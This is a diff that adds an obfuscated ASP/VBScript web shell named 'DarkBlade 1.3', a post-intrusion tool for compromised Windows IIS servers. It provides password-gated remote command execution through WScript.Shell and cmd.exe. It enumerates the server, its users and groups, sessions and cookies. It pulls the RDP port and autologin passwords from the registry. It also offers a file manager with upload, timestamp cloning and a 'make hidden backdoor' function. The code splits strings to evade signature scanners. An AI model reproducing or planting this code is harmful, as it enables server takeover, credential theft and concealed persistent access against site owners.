@@ -1,0 +1,3845 @@
+<%@ LANGUAGE='VBScript' CODEPAGE='65001'%>
+<%
+Response.Buffer=True
+Response.CharSet="utf-8"
+Server.ScriptTimeOut=300
+'-------------------------------Config-------------------------------
+'Private version, do not share it to anybody!
+'DarkBlade 1.3
+'Final version, no more update
+'Thanks to these hackers:Bin, Luyu, Sht
+Const pass="BC387861814788127B8307F82B8D8F"
+Const awizo=True
+Const xgezc=100
+Const lslt=False
+Const ojkin="_"
+Const fmded="godj|ubh|wuzw|kpc|mmz|svy|pex|ftrkd|upt|orl|thrma|pbff|rlda|yth|ojmov|fyd|fxgdn|fjkrx|zza|svle|rlbgp"
+Const cew="login"
+Const ydbj="GB2312"
+Const iypdn="asp|asa|cer|cdx"
+Const wjjkt="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"
+Const vpusk=50
+Const kicu="zzzzzzzz.html"
+Const udou=False'
+'-------------------------------Config-------------------------------
+
+Dim goaction,godj,wuzw,kpc,svy,pex,zwf,rstb,qkpnf,grl,njt,cykbq,zigbe,djdla,bcaf,lsij,yorji,qnvke,iwhpp,cemz,ftrkd,xgr,ugxy,uecj,ubh,jyez,ydoho,ufvzc,twak,niyp,nwwj,njwkr,qmlr,ycqmn,conn,upt,bvo,ejs,rwhai,cbr,yqpew,orl,thrma,zbxwy,pbff,rlda,uskgs,yth,ojmov,ayda,otg,lpsji,qaikf,aokt,gghq,mt,fyd,zza,fxgdn,fjkrx,qotel,jkjzp,kjmro,lfwna,mmz,ajwy,xvnzo,fxu,tekgs,kfh,eloe,rks,ojji,lemq,csw,wvyd,jxsiz,ajjwi,gshog,wwkh,nuser,npass,urok,okw,svle,rlbgp,puf,fkxwm,skj
+ajwy="DarkBlade 1.3 Private"
+xvnzo="DarkBlade"
+fxu="DarkBladePa"&yyu&"ss"
+vqg()
+gshog=ksu()
+If gshog Then
+lveer()
+Else
+goaction=request("goaction")
+End If
+If Not gshog And goaction<>cew Then wku()
+If udou And Trim(tbsei("AUTH_US"&ibkz&"ER"))="" Then
+Response.Status="401 Unautho"&yitz&"rized"
+Response.Addheader"WWW-AuThentica"&djn&"te","BASIC"
+If tbsei("AUTH_US"&ibkz&"ER")=""Then Response.End()
+End If
+Select Case goaction
+Case cew
+rdhh()
+Case"txi"
+mih()
+Case"ytj"
+juymi()
+Case"oyh"
+zidhw()
+Case"xjl"
+jcx()
+Case"uiph"
+gas()
+Case"yymjd"
+itob()
+Case"splk"
+jiawi()
+Case"mxapl"
+wks()
+Case"oytw"
+koe()
+Case"fzsmc"
+ijfeg()
+Case"Logout"
+gocbb()
+Case"rsqvg"
+uko()
+Case"glyx","jmed"
+vefdi()
+Case Else
+vefdi()
+End Select
+vres
+Sub vqg()
+If Not lslt Then On Error Resume Next
+lsij=Timer()
+Dim jubey,fte,cqcda,aizl,ddp,byv,umju,avj
+servurl=tbsei("URL")
+Set rstb=zkew("MSX"&qramo&"ML2.XMLH"&ldd&"TTP")
+Set qkpnf=zkew("WScri"&msn&"pt.Sh"&qvef&"ell")
+Set grl=zkew("Scripti"&kwaa&"ng.FileS"&voli&"ystemObject")
+Set njt=zkew("She"&uqc&"ll.Appl"&dray&"ication")
+If Not IsObject(qkpnf)Then Set qkpnf=zkew("WScri"&msn&"pt.She"&uqc&"ll.1")
+If Not IsObject(njt)Then Set njt=zkew("She"&uqc&"ll.Appl"&dray&"ication.1")
+Set zigbe=new RegExp
+zigbe.Global=True
+zigbe.IgnoreCase=True
+zigbe.MultiLine=True
+zwf=tbsei("SERVER_NAME")
+djdla=tbsei("PATH_INFO")
+bcaf=Lcase(rqv(djdla,"/"))
+qnvke=rumla(".")
+iwhpp=rumla("/")
+jyez=1
+xgr=1
+End Sub
+Sub lveer()
+For Each fte In request.queryString
+execute fte&"=request.queryString("""&fte&""")"
+Next
+For Each jubey In request.Form
+execute jubey&"=request.form("""&jubey&""")"
+Next
+If InStr(tbsei("CONTENT_TYPE"),"multipart/form-data")=1 Then
+Set okw=new upload_5xsoft
+For Each cqcda In okw.ywdgw
+execute cqcda&"=okw.ywdgw("""&cqcda&""")"
+Next
+End If
+avj=Split(fmded,"|")
+For Each umju In avj
+execute""&umju&"=yfup("&umju&")"
+Next
+If Right(godj,1)="\"And Len(godj)>3 Then godj=Left(godj,Len(godj)-1)
+End Sub
+Sub vres()
+If Not lslt Then On Error Resume Next
+Dim qloqx
+rstb.abort
+Set rstb=Nothing
+Set qkpnf=Nothing
+Set grl=Nothing
+Set njt=Nothing
+Set zigbe=Nothing
+yorji=timer()
+qloqx=yorji-lsij
+echo"<br></div>"
+ahwr"100%"
+echo"<tr class=""head"">"
+echo"<td>"
+nuauc cemz
+qloqx=FormatNumber(qloqx,5)
+If Left(qloqx,1)="."Then qloqx="0"&qloqx
+nuauc"<br>"
+echo"<div align=right>Processed in :"&qloqx&"seconds</div></td></tr></table></body></html>"
+Response.End()
+End Sub
+Sub rdhh()
+If Not lslt Then On Error Resume Next
+lfwna=request("lfwna")
+If lfwna<>""Then
+lfwna=sgcly(lfwna)
+If sgcly(lfwna)=pass Then
+Response.Cookies(fxu)=lfwna
+Response.Redirect(djdla)
+Else
+avivi"Fuck you,get out!"
+End If
+End If
+lyau"Login"
+echo"<center><br>"
+nef False
+echo"<b>Password : </b>"
+bcnd"password","lfwna","","30",""
+echo" "
+iajgq"Get In"
+echo"</center></form>"
+End Sub
+Sub gas()
+If Not lslt Then On Error Resume Next
+Dim i,aixdm,lqnub,tsj,phgvn,yavyc,nvjii,sfhag,wwxi,uda
+tsj="Syste"&yismq&"mRoot|Win"&azep&"Dir|Co"&smgv&"mSpec|TEMP|TMP|NUMBER_OF_"&wbkl&"PROCESSORS|OS|Os2LibPa"&jnqhg&"th|Path|PAT"&bzep&"HEXT|PROCES"&pvdh&"SOR_ARCHITECTURE|"&_
+"PROCE"&lug&"SSOR_IDENTIfIER|PROCESSOR_"&yvphe&"LEVEL|PR"&wbyja&"OCESSOR_REVISION"
+lqnub=Split(tsj,"|")
+execute "Set aixdm=qkpnf.E"&crz&"nvironment(""SYSTEM"")"
+phgvn=tbsei("NUMBER_OF_"&wbkl&"PROCESSORS")
+If IsNull(phgvn)Or phgvn=""Then
+phgvn=aixdm("NUMBER_OF_"&wbkl&"PROCESSORS")
+End If
+nvjii=tbsei("OS")
+If IsNull(nvjii)Or nvjii=""Then
+nvjii=aixdm("OS")
+nvjii=nvjii&"(probably Windows 2003)"
+End If
+yavyc=aixdm("PROCE"&lug&"SSOR_IDENTIfIER")
+lyau"Server Infomation"
+ahwr"100%"
+ceydb
+echo"<td colspan=""2""align=""center"">"
+echo"<b>Server parameters:</b>"
+echo"</td>"
+potex
+sffh 0
+doTd"Server name:",""
+doTd zwf,""
+potex
+sffh 1
+doTd"Server IP:",""
+doTd tbsei("LOCAL_ADDR"),""
+potex
+sffh 0
+doTd"Server port:",""
+doTd tbsei("SERVER_PORT"),""
+potex
+sffh 1
+doTd"Server Memo"&fcx&"ry",""
+execute "doTd rwumm(njt.Get"&jrgar&"SystemInformation(""PhysicalMemoryInstalled"")),"""""
+potex
+sffh 0
+doTd"Server time",""
+doTd Now,""
+potex
+sffh 1
+doTd"Server soft",""
+doTd tbsei("SERVER_SOFTWARE"),""
+potex
+sffh 0
+doTd"Script timeout",""
+doTd Server.ScriptTimeout,""
+potex
+sffh 1
+doTd"Number of cpus",""
+doTd phgvn,""
+potex
+sffh 0
+doTd"Info of cpus",""
+doTd yavyc,""
+potex
+sffh 1
+doTd"Server OS",""
+doTd nvjii,""
+potex
+sffh 0
+doTd"Server script engine",""
+doTd ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion,""
+potex
+sffh 1
+doTd"File full path",""
+doTd tbsei("PATH_TRANSLATED"),""
+potex
+xgr=0
+For i=0 To UBound(lqnub)
+sffh xgr
+doTd lqnub(i)&":",""
+execute "doTd qkpnf.Expa"&idg&"ndEnvironmentStrings(""%""&lqnub(i)&""%""),"""""
+potex
+ukcm
+Next
+ymw
+goql(Err)
+echo"<br>"
+Set aixdm=Nothing
+Dim ntp
+ahwr"100%"
+ceydb
+echo"<td colspan=""6""align=""center"">"
+echo"<b>Info of disks</b>"
+echo"</td>"
+potex
+sffh 0
+doTd"Driver letter",""
+doTd"Type",""
+doTd"Label",""
+doTd"File system",""
+doTd"Space left",""
+doTd"Total space",""
+potex
+xgr=1
+For Each ntp In grl.Drives
+Dim shoq,nil,uat,fkggf,vbj,azpf
+shoq=ntp.DriveLetter
+If Lcase(shoq)<>"a"Then
+nil=yrktq(ntp.DriveType)
+uat=ntp.VolumeName
+fkggf=ntp.Filesystem
+vbj=rwumm(ntp.FreeSpace)
+execute "azpf=rwumm(ntp.Total"&qxbqx&"Size)"
+sffh xgr
+doTd shoq,""
+doTd nil,""
+doTd uat,""
+doTd fkggf,""
+doTd vbj,""
+doTd azpf,""
+potex
+End If
+shoq=""
+nil=""
+uat=""
+fkggf=""
+vbj=""
+azpf=""
+ukcm
+Next
+ymw
+goql(Err)
+Set ntp=Nothing
+Dim feh
+Set feh=grl.GetFolder(iwhpp)
+echo"<br>"
+ahwr"100%"
+ceydb
+echo"<td colspan=""2""align=""center"">"
+echo"<b>Info of site:</b>"
+echo"</td>"
+potex
+sffh 0
+doTd"Physi"&eefq&"cal path:",""
+doTd iwhpp,""
+potex
+sffh 1
+doTd"Current size:",""
+doTd rwumm(feh.Size),""
+potex
+sffh 0
+doTd"File count:",""
+doTd feh.Files.Count,""
+potex
+sffh 1
+doTd"Folder count:",""
+doTd feh.SubFolders.Count,""
+potex
+ymw
+goql(Err)
+nuauc"<br>"
+Dim ksgbr,zjs,ffgp
+Dim eyd,tfu,ewt,zkqmy
+sfhag="HKEY_LOCAL_MACHINE\SYSTEM\CurrentContr"&ozgne&"olSet\Control\Te"&gusl&"rminal Server\WinStatio"&ecky&"ns\RDP-T"&aoyhg&"cp\"
+wwxi="PortNumber"
+uda=agppo(sfhag&wwxi)
+If uda=""Then uda="Can't get Te"&gusl&"rminal port.<br/>"
+ksgbr="HK"&fefqk&"LM\SOFT"&japw&"WARE\Microsoft\Windows"&mvt&" NT\Current"&fadf&"Version\Winlo"&mukpk&"gon\"
+tfu="AutoAdm"&tag&"inLogon"
+zjs="Default"&xcyy&"UserName"
+ffgp="De"&sls&"faultPassword"
+eyd=agppo(ksgbr&tfu)
+If eyd=0 Then
+ewt="Autologin isn't enabled"
+Else
+ewt=agppo(ksgbr&zjs)
+End If
+If eyd=0 Then
+zkqmy="Autologin isn't enabled"
+Else
+zkqmy=agppo(ksgbr&ffgp)
+End If
+ahwr"100%"
+ceydb
+echo"<td colspan=""2""align=""center"">"
+echo"<b>Info of Te"&gusl&"rminal port&Autologin</b>"
+echo"</td>"
+potex
+sffh 0
+doTd"Te"&gusl&"rminal port:",""
+doTd uda,""
+potex
+sffh 1
+doTd"Autologin account:",""
+doTd ewt,""
+potex
+sffh 0
+doTd"Autologin password:",""
+doTd zkqmy,""
+potex
+ymw
+echo"</ol>"
+goql(Err)
+End Sub
+Sub mih()
+Dim i,qln,vcfv,ibj
+vcfv="MSW"&fmddd&"C.AdRotator,MSW"&fmddd&"C.Browse"&pmjf&"rType,MSW"&fmddd&"C.NextLink,MSW"&fmddd&"C.TOOLS,MSW"&fmddd&"C.Status,MSW"&fmddd&"C.Counters,IISS"&blhvq&"ample.ContentRotat"&yjn&"or,IISS"&blhvq&"ample.Pag"&ebnc&"eCounter,MSW"&fmddd&"C.Perm"&nrrf&"issionChecker,Ado"&pgjme&"db.Conne"&kvcfz&"ction,So"&jcl&"ftArtisans.Fil"&cieq&"eUp,So"&jcl&"ftArtisans.Fi"&dfom&"leManager,LyfUpload.UploadFile,Persit"&flsl&"s.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persit"&flsl&"s.Mailsender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer,IISmail.Iismail.1,SmtpMail.SmtpMail.1,So"&jcl&"ftArtisans.ImageGen,W3Image.Image,Scripti"&kwaa&"ng.FileS"&voli&"ystemObject,Ado"&pgjme&"db.S"&fmt&"tream,She"&uqc&"ll.Appl"&dray&"ication,She"&uqc&"ll.Appl"&dray&"ication.1,WScri"&msn&"pt.Sh"&qvef&"ell,WScri"&msn&"pt.She"&uqc&"ll.1,WScri"&msn&"pt.Network,hzhost.modules"
+ibj="Ad Rotator,Browser info,NextLink,,,Counters,Content rotator,,Permission checker,ADODB connection,SA-FileUp,SoftArtisans FileManager,LyfUpload,ASPUpload,Dimac upload,Dimac JMail,CDONTS SMTP mail,ASPemail,ASPmail,dkQmail,Geocel mail,IISmail,SmtpMail,SoftArtisans ImageGen,Dimac W3Image,FSO,Stream ,,,,,,Hzhost module"
+aryObjectList=Split(vcfv,",")
+aryDscList=Split(ibj,",")
+lyau"Server Object Probe"
+echo"Check for other ObjectId or ClassId.<br>"
+nef True
+bcnd"text","ftrkd",ftrkd,50,""
+echo" "
+iajgq"Check"
+cmj
+If ftrkd<>""Then
+dwq
+Call viiks(ftrkd,"")
+echo"</ul>"
+End If
+echo"<hr/>"
+echo"<ul class=""info""><li><u>Object name</u>Status and more</li>"
+For i=0 To UBound(aryDscList)
+Call viiks(aryObjectList(i),aryDscList(i))
+Next
+echo"</ul><hr/>"
+End Sub
+Sub juymi()
+Dim xssr,orum,ejt
+lyau"Users and Groups Imformation"
+Set ejt=getObj("WinNT://.")
+ejt.Filter=Array("User")
+xstrw"User",False
+ahwr"100%"
+For Each xssr in ejt
+ceydb
+echo"<td colSpan=""2""align=""center""><b>"&xssr.Name&"</b></td>"
+potex
+iwtng(xssr.Name)
+Next
+ymw
+echo"</span><br>"
+goql(Err)
+xstrw"UserGroup",False
+ejt.Filter=Array("Group")
+ahwr"100%"
+xgr=1
+For Each orum in ejt
+sffh xgr
+doTd orum.Name,""
+doTd orum.Description,""
+potex
+ukcm
+Next
+ymw
+echo"</span>"
+goql(Err)
+End Sub
+Sub zidhw()
+If Not lslt Then On Error Resume Next
+Dim dyoft,mjv,fwimm,ysk
+If ugxy<>""Then Session(ugxy)=uecj
+lyau"Server-Client Information"
+xstrw"ServerVariables",True
+ahwr"100%"
+xgr=1
+For Each fwimm In Request.ServerVariables
+sffh xgr
+vhkz fwimm
+doTd tbsei(fwimm),""
+potex
+ukcm
+Next
+ymw
+nuauc"</span><br>"
+xstrw"Application",True
+ahwr"100%"
+xgr=1
+For Each fwimm In Application.Contents
+sffh xgr
+vhkz fwimm
+doTd vaiy(Application(fwimm)),""
+potex
+ukcm
+Next
+ymw
+nuauc"</span><br>"
+xstrw"Session",True
+echo"<br>(ID"&Session.SessionId&")"
+ahwr"100%"
+xgr=1
+For Each fwimm In Session.Contents
+ysk=Session(fwimm)
+sffh xgr
+vhkz fwimm
+doTd vaiy(ysk),""
+potex
+ukcm
+Next
+sffh xgr
+nef False
+vkrx"Set Session","20%"
+echo"<td width=""80%""> Key :"
+bcnd"text","ugxy","",30,""
+echo"Value :"
+bcnd"text","uecj","",30,""
+echo"</td>"
+cmj
+potex
+ymw
+nuauc"</span><br>"
+xstrw"Cookies",True
+ahwr"100%"
+xgr=1
+For Each fwimm In Request.Cookies
+If Request.Cookies(fwimm).HasKeys Then
+For Each dyoft In Request.Cookies(fwimm)
+sffh xgr
+vhkz fwimm&"("&dyoft&")"
+doTd vaiy(Request.Cookies(fwimm)(dyoft)),""
+potex
+ukcm
+Next
+Else
+sffh xgr
+vhkz fwimm
+doTd vaiy(Request.Cookies(fwimm)),""
+potex
+ukcm
+End If
+Next
+ymw
+echo"</span>"
+goql(Err)
+End Sub
+Sub jcx()
+Dim kfe,gsvkf
+If Not lslt Then On Error Resume Next
+lyau("WScri"&msn&"pt.Sh"&qvef&"ell Execute")
+If ubh<>""Then
+If InStr(Lcase(ubh),"cmd.exe")>0 And InStr(wuzw,"/c ")<1 Then
+gsvkf=ubh&" /c "&wuzw
+Else
+gsvkf=ubh&" "&wuzw
+End If
+If csw=1 Then
+execute "kfe=qkpnf.Exe"&jza&"c(gsvkf).StdOut.ReadAl"&zih&"l()"
+Else
+execute "qkpnf.R"&pskj&"un gsvkf,0,False"
+End If
+goql(Err)
+Else
+ubh="C:\RECYCLER\cmd.exe"
+End If
+ahwr"100%"
+nef True
+sffh 1
+doTd"Path","20%"
+vkrju"text","ubh",ubh,"60%","",""
+echo"<td>"
+kbae"csw",1," View result ","checked"
+iajgq"Run"
+echo"</td>"
+potex
+sffh 0
+doTd"Parameters",""
+vkrju"text","wuzw",wuzw,"","","2"
+potex
+cmj
+ymw
+echo"<hr><b>Result:</b><br><span class=""alt1Span"">"&vaiy(kfe)&"</span>"
+goql(Err)
+End Sub
+Sub vefdi()
+If Not lslt Then On Error Resume Next
+If godj=""Then godj=pex
+If godj=""Then godj=qnvke
+If goaction<>"glyx"Then goaction="jmed"
+If ydoho="down"Then
+umxcb()
+Response.End()
+End If
+If goaction="jmed"Then
+niyp="fso"
+lyau("FSO File Explorer")
+Else
+niyp="sa"
+lyau("APP File Explorer")
+End If
+Select Case ydoho
+Case"lvdf","sxlvq"
+cgqmb()
+godj=saqv(godj,"\",False)
+Case"lmy"
+lmy()
+Case"save","rdeb"
+wei()
+godj=saqv(godj,"\",False)
+Case"cjamq"
+osfe()
+Case"mkp","eqk"
+mkp()
+Case"zws","okwn"
+rum()
+godj=saqv(godj,"\",False)
+Case"xlu","jzen","chutj","qhg"
+mcqbj()
+godj=saqv(godj,"\",False)
+Case"pzhje"
+beh()
+Case"lzv"
+yngq()
+godj=saqv(godj,"\",False)
+Case"kkklu"
+tnq()
+End Select
+If Len(godj)<3 Then godj=godj&"\"
+mtyl()
+End Sub
+Sub mtyl()
+Dim theFolder,tdybr,exs,nwwv,qpfx,prmp,akf,gstq
+If Not lslt Then On Error Resume Next
+If niyp="fso"Then
+Set theFolder=grl.GetFolder(godj)
+nwwv=grl.GetParentFolderName(godj)
+Else
+execute "Set theFolder=njt.NameSp"&xfuaj&"ace(godj)"
+fegof Err
+nwwv=saqv(godj,"\",False)
+If InStr(nwwv,"\")<1 Then
+nwwv=nwwv&"\"
+End If
+End If
+gstq=godj
+If Right(gstq,1)<>"\"Then gstq=gstq&"\"
+tpdyo"gstq",gstq
+nef True
+echo"<b>Current Path :</b>"
+bcnd"text","godj",godj,120,""
+nuauc""
+rhnww"","170px","onchange=""javascript:if(this.value!=''){iajgq('"&goaction&"','',this.value);}"""
+ihxbe"","Drivers/Comm folders"
+ihxbe vaiy(rumla(".")),"."
+ihxbe vaiy(rumla("/")),"/"
+ihxbe"","----------------"
+If Lcase(niyp)="fso"Then
+For Each drive In grl.Drives
+execute "ihxbe drive.Driv"&iuiga&"eLetter&"":\"",drive.Driv"&iuiga&"eLetter&"":\"""
+Next
+ihxbe"","----------------"
+End If
+ihxbe"C:\Program Files","C:\Program Files"
+ihxbe"C:\Program Files\RhinoSoft.com","RhinoSoft.com"
+ihxbe"C:\Program Files\Ser"&pguen&"v-U","Ser"&pguen&"v-U"
+ihxbe"C:\Program Files\Radm"&dkq&"in","Radm"&dkq&"in"
+ihxbe"C:\Program Files\Microsoft SQL Server","Mssql"
+ihxbe"C:\Program Files\Mysql","Mysql"
+ihxbe"","----------------"
+ihxbe"C:\Documents and Settings\All Users","All Users"
+ihxbe"C:\Documents and Settings\All Users\Documents","Documents"
+ihxbe"C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere","PcAnywhere"
+ihxbe"C:\Documents and Settings\All Users\Start Menu\Programs","Start Menu->Programs"
+ihxbe"","----------------"
+ihxbe"D:\Program Files","D:\Program Files"
+ihxbe"D:\Ser"&pguen&"v-U","D:\Ser"&pguen&"v-U"
+ihxbe"D:\Radm"&dkq&"in","D:\Radm"&dkq&"in"
+ihxbe"D:\Mysql","D:\Mysql"
+zkdl
+iajgq"Go"
+cmj
+nuauc"<br><form method=""post"" id=""upform""action="""&djdla&"""enctype=""multipart/form-data"">"
+tpdyo"ydoho","cjamq"
+tpdyo"godj",godj
+ahwr"60%"
+sffh 1
+vkrju"file","upfile","","30%","",""
+doTd"Save As :","15%"
+vkrju"text","svle","","30%","",""
+vkrju"button",""," Upload  ","20%","onClick=""javascript:iajgq('"&goaction&"','cjamq','')""",""
+potex
+cmj
+If niyp="fso"Then
+sffh 0
+nef True
+tpdyo"godj",godj
+tpdyo"ydoho","lmy"
+vkrju"text","njwkr","","","",""
+echo"<td colspan='2'>"
+bcnd"radio","qmlr","file","","checked"
+echo"File"
+bcnd"radio","qmlr","folder","",""
+echo"Folder</td>"
+vkrx"New one",""
+'vkrju"button","makedoor","Make backdoor","","onClick=""javascript:iajgq('"&goaction&"','kkklu','"&djfri(godj)&"')""",""
+cmj
+potex
+End If
+echo"</table><hr>"
+If niyp="fso"Then
+If Not grl.FolderExists(godj)Then
+avivi godj&" Folder dosen't exists or access denied!"
+vres
+End If
+End If
+xstrw"Folders",False
+ahwr"100%"
+ceydb
+doTd"<b>Folder name</b>",""
+doTd"<b>Size</b>",""
+doTd"<b>Last modIfied</b>",""
+echo"<td><b>Action</b>"
+If niyp="fso"Then 
+echo" - "
+goe goaction,"kkklu",djfri(godj),"Make a hidden backdoor here",""
+End If
+echo"</td>"
+potex
+sffh 0
+echo"<td colspan=""4"">"
+goe goaction,"",djfri(nwwv),"Parent Directory",""
+echo"</td>"
+potex
+xgr=1
+If niyp="fso"Then
+For Each objX In theFolder.SubFolders
+akf=objX.DateLastModIfied
+sffh xgr
+echo"<td>"
+goe goaction,"",objX.Name,objX.Name,""
+echo"</td>"
+doTd vaiy("<dir>"),""
+doTd akf,""
+echo"<td>"
+goe goaction,"chutj",objX.Name,"Copy"," -"
+goe goaction,"qhg",objX.Name,"Move"," -"
+goe goaction,"okwn",objX.Name,"Rename"," -"
+goe "rsqvg","flfnc",objX.Name,"Package"," -"
+goe goaction,"sxlvq",objX.Name,"Delete",""
+nuauc"</td>"
+potex
+ukcm
+Next
+Else
+For Each objX In theFolder.Items
+If objX.IsFolder Then
+akf=theFolder.GetDetailsOf(objX,3)
+sffh xgr
+echo"<td>"
+goe goaction,"",objX.Name,objX.Name,""
+echo"</td>"
+doTd vaiy("<dir>"),""
+doTd akf,""
+echo"<td>"
+goe goaction,"okwn",objX.Name,"Rename"," -"
+goe "rsqvg","pwn",objX.Name,"Package",""
+nuauc"</td>"
+potex
+ukcm
+End If
+Next
+End If
+ymw
+nuauc"</span><br>"
+xstrw"Files",False
+ahwr"100%"
+echo"<b>"
+ceydb
+doTd"<b>File name</b>",""
+doTd"<b>Size</b>",""
+doTd"<b>Last modIfied</b>",""
+doTd"<b>Action</b>",""
+potex
+echo"</b>"
+xgr=0
+If niyp="fso"Then
+For Each objX In theFolder.Files
+qpfx=rwumm(objX.Size)
+akf=objX.DateLastModIfied
+If Lcase(Left(objX.Path,Len(iwhpp)))<>Lcase(iwhpp) Then
+tdybr=""
+Else
+tdybr=Replace(Replace(qmkc(Mid(objX.Path,Len(iwhpp)+1)),"%2E","."),"+","%20")
+End If
+sffh xgr
+If tdybr=""Then
+doTd objX.Name,""
+Else
+doTd"<a href='"&Replace(tdybr,"%5C","/")&"' target=_blank>"&objX.Name&"</a>",""
+End If
+doTd qpfx,""
+doTd akf,""
+echo"<td>"
+goe goaction,"mkp",objX.Name,"Edit"," -"
+goe goaction,"xlu",objX.Name,"Copy"," -"
+goe goaction,"jzen",objX.Name,"Move"," -"
+goe goaction,"zws",objX.Name,"Rename"," -"
+goe goaction,"down",objX.Name,"Down"," -"
+goe goaction,"pzhje",objX.Name,"Attributes"," -"
+euk "nqj",objX.Name,"","","","Database"," -"
+goe goaction,"lvdf",objX.Name,"Delete",""
+nuauc"</td>"
+potex
+ukcm
+Next
+Else
+For Each objX In theFolder.Items
+If Not objX.IsFolder Then
+Dim rzq
+rzq=rqv(objX.Path,"\")
+prmp=djfri(objX.Path)
+qpfx=theFolder.GetDetailsOf(objX,1)
+akf=theFolder.GetDetailsOf(objX,3)
+If Lcase(Left(objX.Path,Len(iwhpp)))<>Lcase(iwhpp) Then
+tdybr=""
+Else
+tdybr=Replace(Replace(qmkc(Mid(objX.Path,Len(iwhpp)+1)),"%2E","."),"+","%20")
+End If
+sffh xgr
+If tdybr=""Then
+doTd rqv(objX.Path,"\"),""
+Else
+doTd"<a href='"&Replace(tdybr,"%5C","/")&"' target=_blank>"& rqv(objX.Path,"\")&"</a>",""
+End If
+doTd qpfx,""
+doTd akf,""
+echo"<td>"
+goe goaction,"mkp",rzq,"Edit"," -"
+goe goaction,"zws",rzq,"Rename"," -"
+goe goaction,"down",rzq,"Down"," -"
+goe goaction,"pzhje",rzq,"Attributes"," -"
+euk "nqj",rzq,"","","","Database",""
+nuauc"</td>"
+potex
+ukcm
+End If
+Next
+End If
+ymw
+echo"</span>"
+goql(Err)
+End Sub
+Sub beh()
+Dim gggs,ebyts,zlc,mzjhb,xeydl,gpq,xkjzd,xwl
+If Not lslt Then On Error Resume Next
+If IsObject(grl)Then
+Set gggs=grl.GetFile(godj)
+End If
+If IsObject(njt)Then
+xkjzd=saqv(godj,"\",False)
+zlc=rqv(godj,"\")
+execute "Set gpq=njt.N"&nkry&"ameSpace(xkjzd)"
+Set ebyts=gpq.ParseName(zlc)
+End If
+echo"<center>"
+ahwr"60%"
+nef True
+tpdyo"ydoho","lzv"
+tpdyo"godj",godj
+sffh 1
+vkrx"Set / Clone",""
+doTd godj,""
+potex
+sffh 0
+doTd"Attributes",""
+If IsObject(grl)Then
+xeydl=gggs.Attributes
+mzjhb="<input type=checkbox name=ajjwi value=4 class='input' {$system}>system "
+mzjhb=mzjhb&"<input type=checkbox name=ajjwi value=2 class='input' {$hidden}>hide "
+mzjhb=mzjhb&"<input type=checkbox name=ajjwi value=1 class='input' {$readonly}>readonly "
+mzjhb=mzjhb&"<input type=checkbox name=ajjwi value=32 class='input' {$archive}>save "
+If xeydl>=128 Then xeydl=xeydl-128
+If xeydl>=64 Then xeydl=xeydl-64
+If xeydl>=32 Then
+xeydl=xeydl-32
+mzjhb=Replace(mzjhb,"{$archive}","checked")
+End If
+If xeydl>=16 Then xeydl=xeydl-16
+If xeydl>=8 Then xeydl=xeydl-8
+If xeydl>=4 Then
+xeydl=xeydl-4
+mzjhb=Replace(mzjhb,"{$system}","checked")
+End If
+If xeydl>=2 Then
+xeydl=xeydl-2
+mzjhb=Replace(mzjhb,"{$hidden}","checked")
+End If
+If xeydl>=1 Then
+xeydl=xeydl-1
+mzjhb=Replace(mzjhb,"{$readonly}","checked")
+End If
+doTd mzjhb,""
+Else
+doTd"FSO object disabled,can't get/Set attributes -_-~!",""
+End If
+potex
+If IsObject(njt)Then
+sffh 1
+doTd"Date created",""
+doTd gpq.GetDetailsOf(ebyts,4),""
+potex
+sffh 0
+doTd"Date last modIfied",""
+vkrju"text","wvyd",gpq.GetDetailsOf(ebyts,3),"","",""
+potex
+sffh 1
+doTd"Date last accessed",""
+doTd gpq.GetDetailsOf(ebyts,5),""
+potex
+Else
+sffh 1
+doTd"Date created",""
+execute "doTd gggs.DateCre"&ulmh&"ated,"""""
+potex
+sffh 0
+doTd"Date last modIfied",""
+doTd gggs.DateLastModIfied,""
+potex
+sffh 1
+doTd"Date last accessed",""
+doTd gggs.DateLastAccessed,""
+potex
+End If
+sffh 0
+If IsObject(njt)Then
+doTd"Clone time ",""
+echo"<td>"
+rhnww"jxsiz","100%",""
+ihxbe "","Do not clone"
+For Each objX In gpq.Items
+If Not objX.IsFolder Then
+xwl=rqv(objX.Path,"\")
+ihxbe xwl,gpq.GetDetailsOf(gpq.ParseName(xwl),3)&" --- "&xwl
+End If
+Next
+Else
+echo"<td colspan=2>App object disabled,can't modIfy time -_-~!</td>"
+End If
+ymw
+cmj
+vres()
+End Sub
+Sub yngq()
+If Not lslt Then On Error Resume Next
+Dim owyt,gggs,xkjzd,zlc,gpq,ebyts
+If IsObject(grl)Then
+Set gggs=grl.GetFile(godj)
+End If
+If IsObject(njt)Then
+xkjzd=saqv(godj,"\",False)
+zlc=rqv(godj,"\")
+execute "Set gpq=njt.N"&nkry&"ameSpace(xkjzd)"
+Set ebyts=gpq.ParseName(zlc)
+End If
+If ajjwi<>""Then
+ajjwi=Split(Replace(ajjwi," ",""),",")
+For i=0 To UBound(ajjwi)
+owyt=owyt+CInt(ajjwi(i))
+Next
+gggs.Attributes=owyt
+If Err Then
+goql(Err)
+Else
+avivi"Attributes modIfied"
+End If
+End If
+If jxsiz=""Then
+If wvyd<>"" And IsDate(wvyd)Then
+ebyts.ModIfyDate=wvyd
+If Err Then
+goql(Err)
+Else
+avivi"Time modIfied"
+End If
+End If
+Else
+ebyts.ModIfyDate=gpq.GetDetailsOf(gpq.ParseName(jxsiz),3)
+If Err Then
+goql(Err)
+Else
+avivi"Time modIfied"
+End If
+End If
+End Sub
+Sub tnq()
+If fileName<>""Then
+Dim ftq,mmmnv
+ftq="\\.\"&godj&"\"&fileName
+If skj=1 Then
+execute "Call grl.Move"&pheb&"File(tbsei(""PATH_TRANSLATED""),ftq)"
+Set mmmnv=grl.GetFile(ftq)
+mmmnv.Attributes=6
+Response.Redirect(fileName)
+Else
+rwha ftq,nwwj
+Set mmmnv=grl.GetFile(ftq)
+mmmnv.Attributes=6
+End If
+If Err Then
+goql(err)
+Else
+avivi("Backdoor established,have fun.")
+End If
+Exit Sub
+End If
+nef True
+ahwr"100%"
+tpdyo"ydoho","kkklu"
+nuauc"<b>Make hidden backdoor</b><br>"
+ahwr"100%"
+sffh 1
+doTd"Path","20%"
+vkrju"text","godj",godj,"60%","",""
+vkrx"Save","20%"
+potex
+sffh 0
+doTd"Content",""
